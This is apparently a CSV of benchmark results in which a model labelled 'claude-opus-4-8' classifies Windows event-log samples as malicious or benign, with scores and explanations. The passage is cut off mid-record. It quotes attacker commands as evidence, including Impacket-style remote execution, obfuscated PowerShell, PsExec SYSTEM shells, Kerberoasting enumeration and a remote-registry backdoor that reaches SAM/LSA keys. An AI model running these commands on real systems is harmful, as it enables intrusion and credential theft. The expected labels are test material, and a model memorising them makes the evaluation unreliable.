+This event shows the legitimate Microsoft-signed whoami.exe being launched from PowerShell by a standard user at Medium integrity. While whoami is sometimes used during reconnaissance, this single execution with no chained suspicious commands, network activity, or privilege escalation is consistent with routine administrative or user activity and is not malicious on its own."
+claude-opus-4-8,BENIGN-ID1-rundll32-shell32-dll-shcreatelocalserverrundll.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe","DESKTOP-A8CALR3\user, NT AUTHORITY\SYSTEM","C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {9BA05972-F6A8-11CF-A442-00A0C90A8F39} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p",,,0.0,5.20,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe
+- Accounts: DESKTOP-A8CALR3\user, NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {9BA05972-F6A8-11CF-A442-00A0C90A8F39} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This is a legitimate, signed Microsoft rundll32.exe invocation of shell32.dll's SHCreateLocalServerRunDll with the -Embedding flag, spawned by svchost.exe running DcomLaunch — a standard COM/DCOM activation pattern in Windows. The file is properly signed by Microsoft Corporation with matching original filename and version, and the command line references a well-known shell CLSID. No suspicious network activity, encoded commands, or anomalous parent-child relationships are present."
+claude-opus-4-8,BENIGN-ID1-wevtutil-uninstall-manifest.csv,,,processed,NO,100.0,100.0,YES,1,"wevtutil.exe, MsMpEng.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\wevtutil.exe uninstall-manifest ""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2111.5-0\Microsoft-Antimalware-AMFilter.man""",,,0.0,4.19,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: wevtutil.exe, MsMpEng.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\wevtutil.exe uninstall-manifest ""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2111.5-0\Microsoft-Antimalware-AMFilter.man""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows wevtutil.exe uninstalling a Windows Defender event manifest, launched by the legitimate, signed Defender engine MsMpEng.exe from its standard ProgramData platform path. The parent-child relationship and SYSTEM context are consistent with routine Defender platform update/maintenance activity rather than log tampering by an external actor."
+claude-opus-4-8,"ID7000,7009,7045-Payload deployed via service - Tchopper.evtx",medium,A,processed,YES,100.0,66.7,YES,"7045, 7009, 7000, 7036","cmd.exe, powershell",LocalSystem,"c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt""",,,0.0,11.10,4.0,5.0,4.0,3,16.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 7045, 7009, 7000, 7036
+- Processes: cmd.exe, powershell
+- Accounts: LocalSystem
+- Commands: c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Hundreds of services (Event ID 7045) are being created in rapid succession by Service Control Manager, each with a ServiceName containing sequential Base64-encoded fragments (seg1 through seg245) that decode to a large PowerShell script, and each immediately fails (Event IDs 7009/7000, error %%1053 timeout). This service-name smuggling technique abuses ImagePath to run cmd.exe/powershell as LocalSystem and reassemble a payload into tmp_payload.txt, which is highly anomalous and consistent with covert script staging/execution rather than legitimate service installation."
+claude-opus-4-8,"ID11,13,17,18-PSexec as system execution.csv",,,processed,YES,100.0,74.2,YES,"1, 13, 11, 17, 18, 22","C:\TOOLS\PsExec64.exe, C:\Windows\PSEXESVC.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\services.exe, System","OFFSEC\admmig, NT AUTHORITY\SYSTEM","PsExec64.exe  -i -s cmd, ""cmd"" , C:\Windows\PSEXESVC.exe","10.23.42.38, fs03vuln","HKU\S-1-5-21-4230534742-2542757381-3142984815-1111\Software\Sysinternals\PsExec\EulaAccepted, HKLM\System\CurrentControlSet\Services\PSEXESVC\Start, HKLM\System\CurrentControlSet\Services\PSEXESVC\ImagePath",0.0,7.05,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1, 13, 11, 17, 18, 22
+- Processes: C:\TOOLS\PsExec64.exe, C:\Windows\PSEXESVC.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\services.exe, System
+- Accounts: OFFSEC\admmig, NT AUTHORITY\SYSTEM
+- Commands: PsExec64.exe  -i -s cmd, ""cmd"" , C:\Windows\PSEXESVC.exe
+- Network: 10.23.42.38, fs03vuln
+- Registry: HKU\S-1-5-21-4230534742-2542757381-3142984815-1111\Software\Sysinternals\PsExec\EulaAccepted, HKLM\System\CurrentControlSet\Services\PSEXESVC\Start, HKLM\System\CurrentControlSet\Services\PSEXESVC\ImagePath
+
+EXPLANATION:
+PsExec64.exe was run with ""-i -s cmd"" to spawn a SYSTEM-level command shell, dropping PSEXESVC.exe and registering it as a service for remote execution. The chain shows privilege escalation from OFFSEC\admmig (High integrity) to NT AUTHORITY\SYSTEM via named pipes (\PSEXESVC) consistent with T1035/T1077 lateral movement and service execution. This pattern of service install, named-pipe creation, and SYSTEM cmd spawn indicates malicious/attacker tradecraft."
+claude-opus-4-8,"ID4688,4698,4699,5145,4624-ATexec remote trask creation (GLOBAL).csv",,,processed,YES,100.0,80.0,YES,"4624, 5145, 4698, 4688, 4699","cmd.exe, conhost.exe, whoami.exe, svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\svchost.exe","admmig, FS01$","cmd.exe /C whoami > C:\Windows\Temp\bouWFQYO.tmp 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami","10.23.23.9, 10.23.123.11",,0.0,7.74,4.8,6.0,4.0,4,18.8,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 5145, 4698, 4688, 4699, 5145
+- Processes: cmd.exe, conhost.exe, whoami.exe, svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\svchost.exe
+- Accounts: admmig, FS01$
+- Commands: cmd.exe /C whoami > C:\Windows\Temp\bouWFQYO.tmp 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami
+- Network: 10.23.23.9, 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+This sequence shows a classic remote task-scheduler attack (Impacket atexec-style): a network logon over IPC$ accessing the atsvc named pipe, followed by creation of a hidden scheduled task (4698 ""\bouWFQYO"") running cmd.exe as LocalSystem to execute ""whoami"" with output redirected to a temp file. The task was created and then immediately deleted (4699), and the output file was read back over ADMIN$, indicating remote command execution and result exfiltration rather than legitimate scheduled task usage. The random task name, hidden flag, SYSTEM run level, and pipe-based remote interaction are strong indicators of lateral movement/remote code execution."
+claude-opus-4-8,"ID4688,5140,5145-WMIexec execution via SMB (GLOBAL).csv",,,processed,YES,100.0,94.4,YES,"1102, 4964, 4672, 4624, 4627, 4688, 4674, 5140, 5145, 4690, 4658, 4656, 5447","cmd.exe, conhost.exe, WmiPrvSE.exe, cscript.exe, MonitoringHost.exe","admmig, SRVDEFENDER01$","cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""","10.23.123.11, 127.0.0.1","\REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates",0.0,12.14,5.7,6.0,4.0,4,19.7,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4964, 4672, 4624, 4627, 4688, 4674, 5140, 5145, 4690, 4658, 4656, 5447
+- Processes: cmd.exe, conhost.exe, WmiPrvSE.exe, cscript.exe, MonitoringHost.exe
+- Accounts: admmig, SRVDEFENDER01$
+- Commands: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
+- Network: 10.23.123.11, 127.0.0.1
+- Registry: \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates
+
+EXPLANATION:
+The log opens with Event 1102 (Security log cleared) by admmig, a classic anti-forensic/defense-evasion action, immediately followed by repeated NTLM network logons from 10.23.123.11 and WmiPrvSE.exe spawning cmd.exe writing output to \\127.0.0.1\ADMIN$\__<timestamp> — the signature pattern of WMIexec-style remote command execution. The chained behavior (log clearing, remote WMI process creation redirecting to ADMIN$, and certificate-store registry access via cscript) reflects an attacker performing lateral movement and command execution, not routine administration."
+claude-opus-4-8,ID1-WMI spwaning PowerShell process - WMImplant.evtx,easy,B,processed,YES,100.0,100.0,YES,1,"powershell.exe, WmiPrvSE.exe",OFFSEC\admmig,"powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i')), C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",,,0.0,4.79,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: powershell.exe, WmiPrvSE.exe, wmiprvse.exe
+- Accounts: OFFSEC\admmig
+- Commands: powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i')), C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The PowerShell command uses obfuscation techniques (backtick-broken Get-Command and string-format concatenation to build ""iex""/Invoke-Expression) to execute a payload stored in an environment variable, a clear evasion tactic. The parent process WmiPrvSE.exe indicates WMI-based remote execution at High integrity, consistent with lateral movement or remote code execution. The combination of obfuscation, WMI spawning, and the T1086 PowerShell technique tag strongly indicates malicious activity."
+claude-opus-4-8,ID1-WMIexec process execution.evtx,easy,A,processed,YES,100.0,90.0,YES,1,C:\Windows\System32\cmd.exe,NT AUTHORITY\SYSTEM,"C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat , C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt | \\127.0.0.1\C$\__output 2^&gt | ^&amp | 1 &gt | C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat",127.0.0.1,,33.3,5.97,5.4,5.0,2.7,3,16.1,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\cmd.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat , C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat
+- Network: 127.0.0.1
+- Registry: None
+
+EXPLANATION:
+This activity matches the PsExec/Impacket-style remote command execution pattern, where command output is redirected to an admin share (\\127.0.0.1\C$\__output) and commands are written to and run from a temporary batch file that is immediately deleted. Execution as NT AUTHORITY\SYSTEM at System integrity with the cmd.exe spawning cmd.exe chain and self-cleanup is characteristic of lateral movement and remote code execution tooling, not routine administration."
+claude-opus-4-8,ID800-4103-4104-PowerShell BITS job started.evtx,medium,B,processed,YES,100.0,76.7,YES,"800, 4104, 4103","powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",OFFSEC\admmig,Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Users\bits.ps1,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md,,0.0,6.20,4.6,5.0,4.0,3,16.6,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4104, 4103
+- Processes: powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Users\bits.ps1
+- Network: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+- Registry: None
+
+EXPLANATION:
+The user OFFSEC\admmig used Start-BitsTransfer to download a remote file from an internet URL to C:\Users\bits.ps1, a technique mapping to MITRE ATT&CK T1197 (BITS Jobs) used to abuse the Background Intelligent Transfer Service for stealthy ingress tool transfer. Downloading a script to a local path via BITS, combined with the atomic-red-team source URL, is a recognized adversary download/persistence pattern rather than routine administration."
+claude-opus-4-8,"ID4720,4698-Fortinet APT group abuse on Windows.csv",,,processed,YES,100.0,100.0,YES,"4720, 4698",,"WADGUtilityAccount, elie, admmig",adf,,,0.0,4.88,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4720, 4720, 4698
+- Processes: None
+- Accounts: WADGUtilityAccount, elie, admmig
+- Commands: adf
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The actor ""admmig"" rapidly created multiple local accounts (WADGUtilityAccount, elie) on fs01.offsec.lan and then registered a scheduled task (\Microsoft\SynchronizeTimeZone) masquerading under a legitimate-sounding Microsoft path but executing a suspicious, non-descript command (""adf""). The combination of bulk account creation followed by a disguised persistence mechanism indicates malicious activity rather than routine administration."
+claude-opus-4-8,ID33205-SQL Server member added to server role.evtx,easy,A,processed,YES,100.0,93.8,YES,33205,,"OFFSEC\admmig, test-sql, dbo",ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,4.16,5.6,6.0,4.0,3,18.6,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: OFFSEC\admmig, test-sql, dbo
+- Commands: ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]
+- Network: mssql01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The event shows a successful server role membership change (action_id APRL) adding the principal [test-sql] to the highly privileged [sysadmin] server role on the MSSQL instance. Granting sysadmin to an account is a classic SQL Server privilege-escalation/persistence technique, and the principal name ""test-sql"" suggests a non-standard, attacker-created account. This escalation of privileges warrants investigation as malicious activity."
+claude-opus-4-8,ID4688-SPN added to an account.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe","lambda-user, offsec\honey-pot1","SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*",HACK-ME-PC.offsec.lan,,0.0,4.44,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4688
+- Processes: C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe
+- Accounts: lambda-user, offsec\honey-pot1
+- Commands: SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*
+- Network: HACK-ME-PC.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The same user (lambda-user) registers an MSSQL SPN on an account and then enumerates all SPNs in the domain with ""setspn -T offsec -Q */*"", which is the classic reconnaissance step preceding a Kerberoasting attack. The paired SPN creation followed immediately by domain-wide SPN enumeration from cmd.exe indicates deliberate attacker activity rather than routine administration."
+claude-opus-4-8,ID4724-5145-password reset with setNTLM (Mimikatz).evtx,easy,A,processed,YES,100.0,88.9,YES,"4624, 5145, 4724, 4738",,"admmig, hacker2, ROOTDC1$",,"10.23.23.9, fe80::1cae:5aa4:9d8d:106a",,0.0,4.92,5.3,6.0,4.0,4,19.3,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 5145, 4724, 4738
+- Processes: None
+- Accounts: admmig, hacker2, ROOTDC1$
+- Commands: None
+- Network: 10.23.23.9, fe80::1cae:5aa4:9d8d:106a
+- Registry: None
+
+EXPLANATION:
+The account admmig logged on remotely via Kerberos (LogonType 3) from 10.23.23.9 and accessed the IPC$ share's samr pipe, indicating remote SAM/account manipulation. This was immediately followed by a password reset (4724) and account change (4738) targeting hacker2, consistent with an attacker resetting credentials to establish or maintain persistent access. The rapid sequence of remote SAMR access followed by password reset on another account is a strong indicator of malicious account takeover activity."
+claude-opus-4-8,ID4728-4756-Member added to sensitive domain groups.evtx,easy,A,processed,YES,100.0,100.0,YES,"4728, 4756",,"lambda-user, honey-pot1, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins",,rootdc1.offsec.lan,,0.0,4.64,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4728, 4756
+- Processes: None
+- Accounts: lambda-user, honey-pot1, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins
+- Commands: None
+- Network: rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+Within the same second, the account lambda-user added the member honey-pot1 to four of the most privileged domain groups (Domain Admins, Enterprise Admins, Enterprise Key Admins, and Schema Admins) on the root domain controller. This rapid, sequential escalation across multiple high-privilege groups by a single actor is a clear privilege-escalation/persistence pattern, and the target object being named ""honey-pot1"" strongly suggests a deliberate detection trap being triggered by adversarial activity."
+claude-opus-4-8,"ID4674,6416 New external device connected (PrintNightmare).csv",,,processed,YES,100.0,100.0,YES,"6416, 4688, 4674","cmd.exe, conhost.exe, spoolsv.exe, dllhost.exe","FS03$, admmig","""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",\\fs03vuln\Kiwi Legit Printer,"\REGISTRY\USER\S-1-5-21-4230534742-2542757381-3142984815-1111\Printers\Connections\,,fs03vuln,Kiwi Legit Printer",0.0,10.73,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 6416, 4688, 4674
+- Processes: cmd.exe, conhost.exe, spoolsv.exe, dllhost.exe
+- Accounts: FS03$, admmig
+- Commands: ""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+- Network: \\fs03vuln\Kiwi Legit Printer
+- Registry: \REGISTRY\USER\S-1-5-21-4230534742-2542757381-3142984815-1111\Printers\Connections\,,fs03vuln,Kiwi Legit Printer
+
+EXPLANATION:
+The installation of a new print device (""Kiwi Legit Printer"") via the spooler (Event 6416) immediately followed by spoolsv.exe spawning cmd.exe under the SYSTEM account (FS03$) is the classic signature of a PrintNightmare/spooler exploitation chain. The use of SeTakeOwnershipPrivilege on the printer connection registry key and the named ""Legit Printer"" decoy strongly indicate abuse of the print spooler for SYSTEM-level code execution rather than legitimate printer driver installation."
+claude-opus-4-8,"ID47x,4661-4662,5136,4688,4697-SAM the admin (CVE-2021-42287).csv",,,processed,YES,100.0,58.3,YES,"4776, 4624, 5140, 5145, 4661, 4673, 4741, 4724, 4742, 4781, 4662, 4768, 4769, 4697, 4688","C:\Windows\System32\lsass.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe","hack1, compnay-88$, rootdc1, admmhorvath, ROOTDC1$, HealthMailboxa935ecda17404b4a85c3f146fe1def56@offsec.lan",C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt | \\127.0.0.1\C$\__output 2^&gt | ^&amp | 1 &gt | C:\Windows\TEMP\execute.bat &amp | C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp | del C:\Windows\TEMP\execute.bat,"10.23.123.11, ::ffff:10.23.123.11, 127.0.0.1, fe80::1cae:5aa4:9d8d:106a",,0.0,11.03,3.5,6.0,4.0,4,17.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4776, 4624, 5140, 5145, 4661, 4673, 4741, 4724, 4742, 4781, 4662, 4768, 4769, 4697, 4688
+- Processes: C:\Windows\System32\lsass.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe
+- Accounts: hack1, compnay-88$, rootdc1, admmhorvath, ROOTDC1$, HealthMailboxa935ecda17404b4a85c3f146fe1def56@offsec.lan
+- Commands: C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp; del C:\Windows\TEMP\execute.bat
+- Network: 10.23.123.11, ::ffff:10.23.123.11, 127.0.0.1, fe80::1cae:5aa4:9d8d:106a
+- Registry: None
+
+EXPLANATION:
+This shows a domain compromise: account hack1 creates a computer account (compnay-88$) via SeMachineAccountPrivilege then renames its SamAccountName/dNSHostName to ""rootdc1"" (4741/4742/4781), a hallmark of the noPac (CVE-2021-42278/42287) attack to impersonate the domain controller and obtain Kerberos tickets (4768/4769) for the DC. Subsequently admmhorvath connects over IPC$ and creates a service ""BTOBTO"" running an obfuscated cmd.exe payload that writes output to \\127.0.0.1\C$\__output, the classic Impacket smbexec remote code execution pattern. The combination of machine-account spoofing, ticket abuse, and remote service-based command execution against the DC is clearly malicious."
+claude-opus-4-8,"ID4674,5142-Mimikatz print spool privileges requested.csv",,,processed,YES,100.0,100.0,YES,"4674, 5142",C:\Windows\System32\spoolsv.exe,"admmig, FS03VULN$",,\\*\Kiwi Legit Printer,,0.0,4.48,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4674, 5142
+- Processes: C:\Windows\System32\spoolsv.exe
+- Accounts: admmig, FS03VULN$
+- Commands: None
+- Network: \\*\Kiwi Legit Printer
+- Registry: None
+
+EXPLANATION:
+The ""Kiwi Legit Printer"" object name is a hallmark of the Mimikatz/PrintNightmare-style printer driver exploitation, where a fake printer is registered via the Spooler service to load a malicious driver and gain SYSTEM-level execution. The repeated SeTakeOwnershipPrivilege use against the Printer object through spoolsv.exe, paired with new printer share creation (5142) under the SYSTEM machine account, strongly indicates abuse of the Print Spooler for privilege escalation rather than legitimate printer installation."
+claude-opus-4-8,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami",,,0.0,4.80,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4648, 4624, 4688
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
+- Accounts: admmig, test10, FS03$
+- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The security log was cleared (Event 1102) by admmig immediately before an explicit-credential logon (4648) and network logon (4624) using account test10 launched from powershell.exe. This pairing of audit-log destruction followed by credential switching and reconnaissance commands (whoami) is consistent with attacker anti-forensics and lateral movement rather than routine administration."
+claude-opus-4-8,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, FS03VULN$, ANONYMOUS LOGON, S-1-5-18","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff",127.0.0.1,,0.0,5.66,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4624
+- Processes: C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
+- Accounts: hack1, FS03VULN$, ANONYMOUS LOGON, S-1-5-18
+- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
+- Network: 127.0.0.1
+- Registry: None
+
+EXPLANATION:
+The sequence begins with the security log being cleared (Event 1102) by user hack1, a classic anti-forensic action, immediately followed by execution of MSFRottenPotato.exe, a known privilege-escalation tool. The subsequent ANONYMOUS LOGON over NTLM V1 from 127.0.0.1 and a SYSTEM-context (S-1-5-18 / FS03VULN$) cmd.exe spawned from the RottenPotato process confirms a successful token-impersonation privilege escalation to SYSTEM. This combination of log clearing, exploit tooling, and escalation is clearly malicious."
+claude-opus-4-8,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,95.0,YES,"1102, 4688, 4648, 4624, 4672","C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe","admmig, hack1, FS03$","runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe",::1,,0.0,6.21,5.7,6.0,4.0,4,19.7,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4648, 4624, 4672
+- Processes: C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe
+- Accounts: admmig, hack1, FS03$
+- Commands: runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
+- Network: ::1
+- Registry: None
+- Accounts: admmig, hack1, FS03$
+
+EXPLANATION:
+The sequence begins with Event 1102 (Security log cleared by admmig), a classic anti-forensic / defense-evasion action, immediately followed by a runas execution of cmd.exe as a suspicious account ""hack1"". The newly logged-on hack1 account is granted highly sensitive privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege) via Event 4672, indicating a privilege-escalation chain. The combination of log clearing, credential-based runas to a non-standard account, and acquisition of powerful privileges in a short timeframe strongly indicates malicious activity."
+claude-opus-4-8,ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,hard,C,processed,YES,100.0,90.0,YES,"800, 4104, 4103","powershell.exe, C:\TOOLS\Add-RemoteRegBackdoor.ps1",OFFSEC\hack1,"Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0', Get-WMIObject -Class Win32_Service -Filter ""name='RemoteRegistry'"", $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter ""__CLASS = 'StdRegProv'""",FS03,"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg, SYSTEM\CurrentControlSet\Control\Lsa\JD, SYSTEM\CurrentControlSet\Control\Lsa\Skew1, SYSTEM\CurrentControlSet\Control\Lsa\Data, SYSTEM\CurrentControlSet\Control\Lsa\GBG, SECURITY, SAM\SAM\Domains\Account",0.0,8.84,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4104, 4103
+- Processes: powershell.exe, C:\TOOLS\Add-RemoteRegBackdoor.ps1
+- Accounts: OFFSEC\hack1
+- Commands: Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0', Get-WMIObject -Class Win32_Service -Filter ""name='RemoteRegistry'"", $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter ""__CLASS = 'StdRegProv'""
+- Network: FS03
+- Registry: SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg, SYSTEM\CurrentControlSet\Control\Lsa\JD, SYSTEM\CurrentControlSet\Control\Lsa\Skew1, SYSTEM\CurrentControlSet\Control\Lsa\Data, SYSTEM\CurrentControlSet\Control\Lsa\GBG, SECURITY, SAM\SAM\Domains\Account
+
+EXPLANATION:
